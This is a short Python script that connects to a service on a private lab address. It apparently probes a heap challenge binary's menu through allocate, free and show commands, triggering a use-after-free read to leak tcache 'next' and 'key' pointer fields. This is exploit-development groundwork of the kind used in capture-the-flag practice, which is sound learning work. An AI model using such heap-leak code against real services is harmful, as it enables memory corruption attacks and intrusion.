import socket, time

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        self.s.settimeout(2)
    def recv(self, t=1.0):
        buf = b""
        end = time.time() + t
        while time.time() < end:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    break
                buf += chunk
            except socket.timeout:
                break
        return buf
    def cmd(self, data, t=1.0):
        if isinstance(data, str):
            data = data.encode()
        self.s.sendall(data + b"\n")
        return self.recv(t)
    def close(self):
        self.s.close()

c = Conn()
c.recv(1.0)

def new(slot, ln, data):
    c.cmd("1"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def free(slot):
    c.cmd("3"); return c.cmd(str(slot))
def show(slot):
    c.cmd("4"); return c.cmd(str(slot))

new(0, 16, "A"*16)
new(1, 16, "C"*16)
free(0)
free(1)
s1 = show(1).decode(errors="replace")
print("slot1 (head of tcache bin, freed 2nd) show after both freed:\n", s1)

import re
m = re.search(r"raw:([0-9a-f]+)", s1)
if m:
    h = m.group(1)
    nxt = h[0:16]
    key = h[16:32]
    print("next field bytes:", nxt)
    print("key field bytes:", key)

c.close()
